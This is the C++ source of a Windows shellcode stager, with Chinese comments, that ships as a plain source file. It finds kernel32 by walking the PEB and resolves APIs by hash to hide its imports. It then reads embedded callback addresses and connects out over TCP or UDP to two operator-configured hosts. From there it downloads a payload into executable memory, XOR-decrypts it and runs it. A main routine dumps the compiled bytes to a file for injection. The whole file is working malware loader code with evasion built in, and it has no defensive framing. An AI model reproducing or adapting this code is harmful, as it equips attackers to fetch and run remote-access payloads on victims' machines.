// ShellCode_Ntdll.cpp : 定义控制台应用程序的入口点。
//

#include <stdio.h>
#include <tchar.h>
#include <stdint.h>
#include<WinSock2.h>
#include <windows.h>
#include <stdint.h>

// kernel32

//#define GetTickCount_Hash 0x739B463C
//typedef DWORD(__stdcall* _GetTickCount)();

#define GetProcAddress_Hash 0x1AB9B854
typedef void* (__stdcall* _GetProcAddress)(HMODULE, char*);

#define LoadLibraryA_Hash 0x7F201F78
typedef HMODULE(__stdcall* _LoadLibraryA)(LPCSTR lpLibFileName);

#define VirtualAlloc_Hash 0x5E893462
typedef LPVOID(__stdcall* _VirtualAlloc)(LPVOID lpAddress,        // region to reserve or commit
	SIZE_T dwSize,           // size of region
	DWORD flAllocationType,  // type of allocation
	DWORD flProtect          // type of access protection
	);

#define VirtualFree_Hash 0x6488073
typedef BOOL(__stdcall* _VirtualFree)(LPVOID lpAddress,   // address of region
	SIZE_T dwSize,      // size of region  
	DWORD dwFreeType    // operation type
	);

#define lstrcmpiA_Hash 0x705CF2A5
typedef int(__stdcall* _lstrcmpiA)(
	_In_ LPCSTR lpString1,
	_In_ LPCSTR lpString2
	);

// user32
#define MessageBoxA_Hash 0x6DBE321
typedef int(__stdcall* _MessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);

//#define MessageBoxW_Hash 0x6DBE337
//typedef int(__stdcall* _MessageBoxW)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType);

// ntdll
#define RtlDecompressBuffer_Hash 0x4B106265
typedef NTSTATUS(__stdcall* _RtlDecompressBuffer)(
	USHORT CompressionFormat,
	PUCHAR UncompressedBuffer,
	ULONG UncompressedBufferSize,
	PUCHAR CompressedBuffer,
	ULONG CompressedBufferSize,
	PULONG FinalUncompressedSize
	);

#define RtlGetCompressionWorkSpaceSize_Hash 0x8FC8E20
typedef NTSTATUS(__stdcall* _RtlGetCompressionWorkSpaceSize)(
	USHORT CompressionFormatAndEngine,
	PULONG CompressBufferWorkSpaceSize,
	PULONG CompressFragmentWorkSpaceSize
	);

#define RtlZeroMemory_Hash 0xDB579CB
typedef void(__stdcall* _RtlZeroMemory)(IN VOID UNALIGNED* Destination, IN SIZE_T  Length
	);

#define RtlCopyMemory_Hash 0x20484894
typedef void(__stdcall* _RtlCopyMemory)(IN VOID UNALIGNED* Destination,
	IN CONST VOID UNALIGNED* Source, IN SIZE_T  Length);

#define RtlMoveMemory_Hash 0x1518E9C0
typedef void(__stdcall* _RtlMoveMemory)(IN VOID UNALIGNED* Destination,
	IN CONST VOID UNALIGNED* Source, IN SIZE_T  Length);

#define Kernel32Lib_Hash 0x1cca9ce6





//Ws2_32.dll
#define WSAStartup_Hash 0x33522634
typedef int(__stdcall* _WSAStartup)(WORD wVersionRequested, LPWSADATA lpWSAData);

#define socket_Hash 0x26402D9F
typedef SOCKET(__stdcall* _socket)(int af, int, int protocol);

#define getaddrinfo_Hash 0x41539501
typedef INT(__stdcall* _getaddrinfo)(PCSTR   pNodeName, PCSTR  pServiceName, const void* pHints, void* ppResult);

#define freeaddrinfo_Hash 0x785E7DD7
typedef INT(__stdcall* _freeaddrinfo)(_In_ PADDRINFOA pAddrInfo);

#define htons_Hash 0x313A84C8
typedef u_short(__stdcall* _htons)(_In_ u_short hostshort);

#define connect_Hash 0x92B50DA
typedef int(__stdcall* _connect)(SOCKET s, SOCKADDR* name, int namelen);

#define send_Hash 0xF8387DC
typedef int(__stdcall* _send)(SOCKET s, char* buf, int len, int flags);

#define recv_Hash 0xF6134B2
typedef int(__stdcall* _recv)(_In_ SOCKET s, char* buf, int len, int flags);

#define closesocket_Hash 0x14AC161B
typedef int(__stdcall* _closesocket)(_In_  SOCKET s);

#define WSACleanup_Hash 0x4FF42CCF
typedef int(__stdcall* _WSACleanup)();

typedef void(__stdcall* CODE) (_In_ TCHAR*);





//===============================================================================================//
typedef struct _UNICODE_STR {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR pBuffer;
} UNICODE_STR, * PUNICODE_STR;

// WinDbg> dt -v ntdll!_LDR_DATA_TABLE_ENTRY
//__declspec( align(8) )
typedef struct _LDR_DATA_TABLE_ENTRY {
	// LIST_ENTRY InLoadOrderLinks; // As we search from PPEB_LDR_DATA->InMemoryOrderModuleList we dont use the first
	// entry.
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STR FullDllName;
	UNICODE_STR BaseDllName;
	ULONG Flags;
	SHORT LoadCount;
	SHORT TlsIndex;
	LIST_ENTRY HashTableEntry;
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

// WinDbg> dt -v ntdll!_PEB_LDR_DATA
typedef struct _PEB_LDR_DATA  //, 7 elements, 0x28 bytes
{
	DWORD dwLength;
	DWORD dwInitialized;
	LPVOID lpSsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	LPVOID lpEntryInProgress;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

// WinDbg> dt -v ntdll!_PEB_FREE_BLOCK
typedef struct _PEB_FREE_BLOCK  // 2 elements, 0x8 bytes
{
	struct _PEB_FREE_BLOCK* pNext;
	DWORD dwSize;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

// struct _PEB is defined in Winternl.h but it is incomplete
// WinDbg> dt -v ntdll!_PEB
typedef struct __PEB  // 65 elements, 0x210 bytes
{
	BYTE bInheritedAddressSpace;
	BYTE bReadImageFileExecOptions;
	BYTE bBeingDebugged;
	BYTE bSpareBool;
	LPVOID lpMutant;
	LPVOID lpImageBaseAddress;
	PPEB_LDR_DATA pLdr;
	LPVOID lpProcessParameters;
	LPVOID lpSubSystemData;
	LPVOID lpProcessHeap;
	PRTL_CRITICAL_SECTION pFastPebLock;
	LPVOID lpFastPebLockRoutine;
	LPVOID lpFastPebUnlockRoutine;
	DWORD dwEnvironmentUpdateCount;
	LPVOID lpKernelCallbackTable;
	DWORD dwSystemReserved;
	DWORD dwAtlThunkSListPtr32;
	PPEB_FREE_BLOCK pFreeList;
	DWORD dwTlsExpansionCounter;
	LPVOID lpTlsBitmap;
	DWORD dwTlsBitmapBits[2];
	LPVOID lpReadOnlySharedMemoryBase;
	LPVOID lpReadOnlySharedMemoryHeap;
	LPVOID lpReadOnlyStaticServerData;
	LPVOID lpAnsiCodePageData;
	LPVOID lpOemCodePageData;
	LPVOID lpUnicodeCaseTableData;
	DWORD dwNumberOfProcessors;
	DWORD dwNtGlobalFlag;
	LARGE_INTEGER liCriticalSectionTimeout;
	DWORD dwHeapSegmentReserve;
	DWORD dwHeapSegmentCommit;
	DWORD dwHeapDeCommitTotalFreeThreshold;
	DWORD dwHeapDeCommitFreeBlockThreshold;
	DWORD dwNumberOfHeaps;
	DWORD dwMaximumNumberOfHeaps;
	LPVOID lpProcessHeaps;
	LPVOID lpGdiSharedHandleTable;
	LPVOID lpProcessStarterHelper;
	DWORD dwGdiDCAttributeList;
	LPVOID lpLoaderLock;
	DWORD dwOSMajorVersion;
	DWORD dwOSMinorVersion;
	WORD wOSBuildNumber;
	WORD wOSCSDVersion;
	DWORD dwOSPlatformId;
	DWORD dwImageSubsystem;
	DWORD dwImageSubsystemMajorVersion;
	DWORD dwImageSubsystemMinorVersion;
	DWORD dwImageProcessAffinityMask;
	DWORD dwGdiHandleBuffer[34];
	LPVOID lpPostProcessInitRoutine;
	LPVOID lpTlsExpansionBitmap;
	DWORD dwTlsExpansionBitmapBits[32];
	DWORD dwSessionId;
	ULARGE_INTEGER liAppCompatFlags;
	ULARGE_INTEGER liAppCompatFlagsUser;
	LPVOID lppShimData;
	LPVOID lpAppCompatInfo;
	UNICODE_STR usCSDVersion;
	LPVOID lpActivationContextData;
	LPVOID lpProcessAssemblyStorageMap;
	LPVOID lpSystemDefaultActivationContextData;
	LPVOID lpSystemAssemblyStorageMap;
	DWORD dwMinimumStackCommit;
} _PEB, * _PPEB;

typedef struct {
	WORD offset : 12;
	WORD type : 4;
} IMAGE_RELOC, * PIMAGE_RELOC;

#define cast(t, a) ((t)(a))
#define cast_offset(t, p, o) ((t)((uint8_t *)(p) + (o)))

#ifndef NTLIB_ERROR
# define NTLIB_ERROR ((unsigned int) (-1))
#endif  // NTLIB_ERROR


//#define  MYDEBUG
#ifdef MYDEBUG
#define  msg(X,Y,Z,W) func->MessageBoxA((X),(Y),(Z),(W));
#else
#define  msg(X,Y,Z,W) 
#endif


#define NT_SUCCESS(x) ((x) >= 0)
struct ShellCodeInfo
{
	char mark[30];		//标记
	int addrlen1;		//IP1长度
	int szPort1;		//端口1
	bool IsTcp1;		//通信模式1
	int addrlen2;		//IP1长度
	int szPort2;		//端口2
	bool IsTcp2;		//通信模式2
};

typedef struct Func {
	// kernel32
	//_GetTickCount GetTickCount;
	_GetProcAddress GetProcAddress;
	_LoadLibraryA LoadLibraryA;
	_VirtualAlloc VirtualAlloc;
	_VirtualFree VirtualFree;
	_lstrcmpiA lstrcmpiA;
	// ntdll
	_RtlZeroMemory _ZeroMemory;
	_RtlMoveMemory _MoveMemory;


	//Ws2_32.dll
	_WSAStartup WSAStartup;
	_socket socket;
	_getaddrinfo getaddrinfo;
	_freeaddrinfo freeaddrinfo;
	_htons htons;
	_connect connect;
	_send send;
	_recv recv;
	_closesocket closesocket;
	_WSACleanup WSACleanup;

#ifdef MYDEBUG
	//user32.dll
	_MessageBoxA MessageBoxA;
#endif


	SOCKET m_socket;
	SOCKADDR_IN	 ClientAddr;
	CHAR* buff;
	ShellCodeInfo* data;
	TCHAR* confi;
	char* add1;
	char* add2;
} func_t, * func_p;




#ifdef __cplusplus
extern "C" {
#endif  // __cplusplus
	unsigned int __cdecl ntdll_entry();
	void mytcp(func_t* func, int i);
	void myudp(func_t* func, int i);
	uint32_t get_delta();
	uint32_t calc_hashW2(wchar_t* str, int len);
	HMODULE get_kernel32_base();
	uint32_t calc_hash(char* str);
	void* get_proc_address_from_hash(HMODULE module, uint32_t func_hash, _GetProcAddress get_proc_address);
	void ntdll_end();
#ifdef __cplusplus
}
#ifdef _WIN64
#else
DWORD_PTR  geteip32();

#endif
#endif  // __cplusplus


#pragma optimize("ts", on)




unsigned int ntdll_entry() {

	func_t func;
	func.m_socket = NULL;
	func.buff = NULL;
	func.data = NULL;
	func.confi = NULL;

	HMODULE kernel32 = get_kernel32_base();
	//func.GetTickCount = (_GetTickCount)get_proc_address_from_hash(kernel32, GetTickCount_Hash, 0);
	func.GetProcAddress = (_GetProcAddress)get_proc_address_from_hash(kernel32, GetProcAddress_Hash, 0);
	func.LoadLibraryA = (_LoadLibraryA)get_proc_address_from_hash(kernel32, LoadLibraryA_Hash, func.GetProcAddress);
	func.VirtualAlloc = (_VirtualAlloc)get_proc_address_from_hash(kernel32, VirtualAlloc_Hash, func.GetProcAddress);
	func.VirtualFree = (_VirtualFree)get_proc_address_from_hash(kernel32, VirtualFree_Hash, func.GetProcAddress);
	func.lstrcmpiA = (_lstrcmpiA)get_proc_address_from_hash(kernel32, lstrcmpiA_Hash, func.GetProcAddress);

#ifdef MYDEBUG
	char user32[] = { 'u','s','e','r','3','2','.','d','l','l',0 };
	HMODULE user32dll = func.LoadLibraryA(user32);
	func.MessageBoxA = (_MessageBoxA)get_proc_address_from_hash(user32dll, MessageBoxA_Hash, func.GetProcAddress);
#endif

	char s[] = { 'n', 't', 'd', 'l', 'l', 0 };
	HMODULE ntdll = func.LoadLibraryA(s);
	func._ZeroMemory = (_RtlZeroMemory)get_proc_address_from_hash(ntdll, RtlZeroMemory_Hash, func.GetProcAddress);
	func._MoveMemory = (_RtlMoveMemory)get_proc_address_from_hash(ntdll, RtlMoveMemory_Hash, func.GetProcAddress);

#ifdef _WIN64
	char* buff_point = (char*)ntdll_entry;
#else
	char* buff_point = (char*)geteip32();
#endif

	for (int i = 0; i < 21000; i++)
	{
		if (buff_point[i] == 'c' && buff_point[i + 1] == 'o' && buff_point[i + 2] == 'd' && buff_point[i + 3] == 'e' && buff_point[i + 4] == 'm' && buff_point[i + 5] == 'a' && buff_point[i + 6] == 'r' && buff_point[i + 7] == 'k')
		{
			func.data = (ShellCodeInfo*)((DWORD_PTR)buff_point + i);
			func.add1 = (CHAR*)func.VirtualAlloc(0, func.data->addrlen1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			func._ZeroMemory(func.add1, func.data->addrlen1);
			func._MoveMemory(func.add1, (char*)(func.data) + sizeof(ShellCodeInfo), func.data->addrlen1);
			func.add2 = (CHAR*)func.VirtualAlloc(0, func.data->addrlen2, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			func._ZeroMemory(func.add2, func.data->addrlen2);
			func._MoveMemory(func.add2, (char*)(func.data) + sizeof(ShellCodeInfo) + func.data->addrlen1, func.data->addrlen2);
			break;
		}
	}
	func.confi = (TCHAR*)((DWORD_PTR)func.data + sizeof(ShellCodeInfo)) + func.data->addrlen1 + func.data->addrlen2;

	//if (!func.data || !func.confi)  //减少体积
	//	return 0;

	////sleep
	//int dwStart = 0, dwStop = 0;
	//dwStart = func.GetTickCount();
	//dwStop = dwStart;
	//while (dwStop - (func.data->sztime * 1000) < dwStart)
	//{
	//	dwStop = func.GetTickCount();
	//}



	char w[] = { 'W','s','2','_','3','2','.','d','l','l',0 };
	HMODULE Ws2_32dll = func.LoadLibraryA(w);
	func.WSAStartup = (_WSAStartup)get_proc_address_from_hash(Ws2_32dll, WSAStartup_Hash, func.GetProcAddress);
	func.socket = (_socket)get_proc_address_from_hash(Ws2_32dll, socket_Hash, func.GetProcAddress);
	func.getaddrinfo = (_getaddrinfo)get_proc_address_from_hash(Ws2_32dll, getaddrinfo_Hash, func.GetProcAddress);
	func.freeaddrinfo = (_freeaddrinfo)get_proc_address_from_hash(Ws2_32dll, freeaddrinfo_Hash, func.GetProcAddress);	
	func.htons = (_htons)get_proc_address_from_hash(Ws2_32dll, htons_Hash, func.GetProcAddress);
	func.connect = (_connect)get_proc_address_from_hash(Ws2_32dll, connect_Hash, func.GetProcAddress);
	func.send = (_send)get_proc_address_from_hash(Ws2_32dll, send_Hash, func.GetProcAddress);
	func.recv = (_recv)get_proc_address_from_hash(Ws2_32dll, recv_Hash, func.GetProcAddress);
	func.closesocket = (_closesocket)get_proc_address_from_hash(Ws2_32dll, closesocket_Hash, func.GetProcAddress);
	func.WSACleanup = (_WSACleanup)get_proc_address_from_hash(Ws2_32dll, WSACleanup_Hash, func.GetProcAddress);

	WSADATA wsaData;
	if (func.WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		return 0;
	while (TRUE)
	{
		func.data->IsTcp1 ? mytcp(&func, 1) : myudp(&func, 1);
		func.data->IsTcp2 ? mytcp(&func, 2) : myudp(&func, 2);
	}
	func.WSACleanup();
	return 0;
};


void mytcp(func_t* func, int i)
{
	LPVOID 	buff = NULL;
	ADDRINFOA* ip = NULL;
	func->m_socket = func->socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (func->m_socket == INVALID_SOCKET)
		goto end;

	func->buff = (CHAR*)func->VirtualAlloc(0, 512 * 1024 + 14, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!func->buff)
		goto end;

	if (func->getaddrinfo((i == 1) ? func->add1 : func->add2, 0, 0, &ip) != 0)
		goto end;

	func->ClientAddr = *((SOCKADDR_IN*)ip->ai_addr);
	func->ClientAddr.sin_port = func->htons((i == 1) ? func->data->szPort1 : func->data->szPort2);
	if (func->connect(func->m_socket, (SOCKADDR*)&(func->ClientAddr), sizeof(func->ClientAddr)) == SOCKET_ERROR)
		goto end;

#ifdef _WIN64
	char name[] = { '6','4',0 };
#else
	char name[] = { '3','2',0 };
#endif
	int rt = func->send(func->m_socket, name, sizeof(name), 0);
	if (rt <= 0)
		goto end;
	int len = 0;
	int nSize = 0;
	 	buff = func->VirtualAlloc(0, 310 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!buff)
		goto end;
	do
	{
		nSize = func->recv(func->m_socket, (CHAR*)buff, 100 * 1024, 0);
		if (nSize <= 0)
			goto end;
		func->_MoveMemory(func->buff + len, (void*)buff, (DWORD)nSize);
		len += nSize;
	} while (len != (300 * 1024 + 14));
	if (buff)
		func->VirtualFree(buff, 0, MEM_RELEASE);
	msg(0, 0, 0, 0);
	byte* password = (byte*)(func->buff) + 4;
	func->buff = (char*)(func->buff) + 14;
	for (int i = 0, j = 0; i < (int)len; i++)   //加密
	{
		((char*)func->buff)[i] ^= (password[j++]) % 456 + 54;
		if (i % (10) == 0)
			j = 0;
	}
	typedef VOID(__stdcall* CODE) (_In_ TCHAR*);
	CODE fn = ((CODE(*)()) func->buff)();
	fn(func->confi);
	do {} while (1);

end:
	if (ip)
		func->freeaddrinfo(ip);
	if (func->m_socket != INVALID_SOCKET)
		func->closesocket(func->m_socket);		
	if (func->buff)
		func->VirtualFree(func->buff, 0, MEM_RELEASE);	
	if (buff)
		func->VirtualFree(buff, 0, MEM_RELEASE);

}



void myudp(func_t* func, int i)
{
	ADDRINFOA* ip=NULL;
	func->buff = (CHAR*)func->VirtualAlloc(0, 512 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!func->buff)
		return;


	if (func->getaddrinfo((i == 1) ? func->add1 : func->add2, 0, 0, &ip) != 0)
		goto endudp;



#ifdef _WIN64
	BYTE pe = '2';
#else
	BYTE pe = '1';
#endif
	int bao = 0;
	int  times = 0;
	int ret = 0;
	char* recvdbuf = NULL;
	int alldata = 0;
	int alldatanext = 0;
	int  bok = 0;
	int breakout = 0;
	func->ClientAddr = *((SOCKADDR_IN*)ip->ai_addr);
	func->ClientAddr.sin_port = func->htons((i == 1) ? func->data->szPort1 : func->data->szPort2);
	while (i < 15)
	{
		i++;
		msg(0, 0, 0, 0);
		func->m_socket = func->socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if (func->m_socket == INVALID_SOCKET)
			goto endudp;
		if (func->connect(func->m_socket, (SOCKADDR*)&(func->ClientAddr), sizeof(func->ClientAddr)) == SOCKET_ERROR)
			goto endudp;

		do
		{
			if (recvdbuf)
			{
				func->VirtualFree(recvdbuf, 0, MEM_RELEASE);
				recvdbuf = NULL;
			}
			recvdbuf = (CHAR*)func->VirtualAlloc(0, 200, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			func->_MoveMemory(recvdbuf, &pe, 1);	func->_MoveMemory(recvdbuf + 1, &bao, 4);
			int sendLen = func->send(func->m_socket, recvdbuf, 5, 0);  //请求数据
			if (sendLen != 5)
				break;
			ret = func->recv(func->m_socket, recvdbuf, 200, 0);
			if (bao > 0 && bao > times)
			{
				bok = 1;
				break;
			}
			if (ret == SOCKET_ERROR)
			{
				goto endudp;
			}

			if (ret == 12)
				continue;
			if (ret == 16)
				break;
			if (ret == 109)
			{
				int bao0 = -1;	BYTE pe0 = '0';
				func->_MoveMemory(&pe0, recvdbuf, 1);	func->_MoveMemory(&bao0, recvdbuf + 1, 4);
#ifdef _WIN64
				if (pe0 != '2' || bao0 != bao)
				{
					breakout++;
					if (breakout > 60)
						break;
					continue;
				}
#else
				if (pe0 != '1' || bao0 != bao)
				{
					breakout++;
					if (breakout > 6000)
						break;
					continue;
				}
#endif	
				breakout = 0;
				if (bao == 0)
				{
					func->_MoveMemory(&alldata, recvdbuf + 105, 4);
					times = alldata / 100 - (alldata % 100 ? 0 : 1);
				}
				func->_MoveMemory(&alldatanext, recvdbuf + 105, 4);
				if (bao > 0 && alldata != alldatanext)
					break;
				func->_MoveMemory(func->buff + (bao0) * 100, recvdbuf + 5, 100);
				if (bao > 0 && bao == times)
				{
					bok = 1;
					break;
				}

				bao++;
			}
		} while (TRUE);
		if (bok == 1)
		{
			typedef VOID(__stdcall* CODE) (_In_ TCHAR*);
			CODE fn = ((CODE(*)()) func->buff)();
			fn(func->confi);
			do {} while (1);
		}
		else
		{
			if (func->m_socket != INVALID_SOCKET)
			{
				func->closesocket(func->m_socket);
				func->m_socket = INVALID_SOCKET;
			}
		}		
	}
endudp:
	if (ip)
		func->freeaddrinfo(ip);
	if (func->m_socket!= INVALID_SOCKET)
		func->closesocket(func->m_socket);
	if (recvdbuf)
		func->VirtualFree(recvdbuf, 0, MEM_RELEASE);
	if (func->buff)
		func->VirtualFree(func->buff, 0, MEM_RELEASE);

}


#ifdef _WIN64

#else
DWORD_PTR __declspec(naked) geteip32()
{
	__asm {
		mov eax, [esp];
		ret;
	}
}
#endif


uint32_t get_delta() {
	uint32_t r = 0;
#ifndef _WIN64
	__asm {
		call delta;
	delta:
		pop	eax;
		sub	eax, offset delta;
		mov	r, eax
	}
#endif
	return r;
}

uint32_t calc_hashW2(wchar_t* str, int len) {
	uint32_t seed = 131;  // 31 131 1313 13131 131313 etc..
	uint32_t hash = 0;
	for (int i = 0; i < len; i++) {
		wchar_t s = *str++;
		if (s >= 'a') s = s - 0x20;
		hash = hash * seed + s;
	}
	return (hash & 0x7FFFFFFF);
}

HMODULE get_kernel32_base() {
	_PPEB peb = 0;
#ifdef _WIN64
	peb = (_PPEB)__readgsqword(0x60);  // peb
#else
	peb = (_PPEB)__readfsdword(0x30);
#endif
	LIST_ENTRY* entry = peb->pLdr->InMemoryOrderModuleList.Flink;
	while (entry) {
		PLDR_DATA_TABLE_ENTRY e = (PLDR_DATA_TABLE_ENTRY)entry;
		if (calc_hashW2(e->BaseDllName.pBuffer, e->BaseDllName.Length / 2) == Kernel32Lib_Hash) {
			return (HMODULE)e->DllBase;
		}
		entry = entry->Flink;
	}
	return 0;
};

// BKDRHash
uint32_t calc_hash(char* str) {
	uint32_t seed = 131; // 31 131 1313 13131 131313 etc..
	uint32_t hash = 0;
	while (*str) {
		hash = hash * seed + (*str++);
	}
	return (hash & 0x7FFFFFFF);
}

void* get_proc_address_from_hash(HMODULE module, uint32_t func_hash, _GetProcAddress get_proc_address) {
	PIMAGE_DOS_HEADER dosh = cast(PIMAGE_DOS_HEADER, module);
	PIMAGE_NT_HEADERS nth = cast_offset(PIMAGE_NT_HEADERS, module, dosh->e_lfanew);
	PIMAGE_DATA_DIRECTORY dataDict = &nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	if (dataDict->VirtualAddress == 0 || dataDict->Size == 0) return 0;
	PIMAGE_EXPORT_DIRECTORY exportDict = cast_offset(PIMAGE_EXPORT_DIRECTORY, module, dataDict->VirtualAddress);
	if (exportDict->NumberOfNames == 0) return 0;
	uint32_t* fn = cast_offset(uint32_t*, module, exportDict->AddressOfNames);
	uint32_t* fa = cast_offset(uint32_t*, module, exportDict->AddressOfFunctions);
	uint16_t* ord = cast_offset(uint16_t*, module, exportDict->AddressOfNameOrdinals);
	for (uint32_t i = 0; i < exportDict->NumberOfNames; i++) {
		char* name = cast_offset(char*, module, fn[i]);
		if (calc_hash(name) != func_hash) continue;
		return get_proc_address == 0 ? cast_offset(void*, module, fa[ord[i]]) : get_proc_address(module, name);
	}
	return 0;
}
void ntdll_end() {

};

#pragma optimize("ts", off)




#ifdef _WIN64
#ifdef _DEBUG
#define SHELLCODE_HEADER_FILE_NAME L"ShellCode-Debug.bin"
#else
#define SHELLCODE_HEADER_FILE_NAME L"..\\..\\x64\\Release\\执行代码.dll"
#endif
#else
#ifdef _DEBUG
#define SHELLCODE_HEADER_FILE_NAME L"ShellCode-Debug.bin"
#else
#define SHELLCODE_HEADER_FILE_NAME L"..\\..\\Release\\执行代码.dll"
#endif
#endif

#define HASH(x) printf("#define %s_Hash 0x%X\n", x, calc_hash(x))

int _tmain(int argc, _TCHAR* argv[])
{
	//HASH("freeaddrinfo");
	//ntdll_entry();
	uint8_t* start = (uint8_t*)ntdll_entry;
	uint8_t* end = (uint8_t*)ntdll_end;
	size_t size = end - start;
	TCHAR* pFolderPath = SHELLCODE_HEADER_FILE_NAME;
	HANDLE h = CreateFileW(pFolderPath, FILE_WRITE_ACCESS, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	DWORD dwBytesWritten = 0;
	if (INVALID_HANDLE_VALUE == h || NULL == h) {
		return -1;
	}
	else {
		if (!WriteFile(h, start, (DWORD)size, &dwBytesWritten, NULL)) {
			return -1;
		}
		FlushFileBuffers(h);
		CloseHandle(h);
	}
	return 0;
}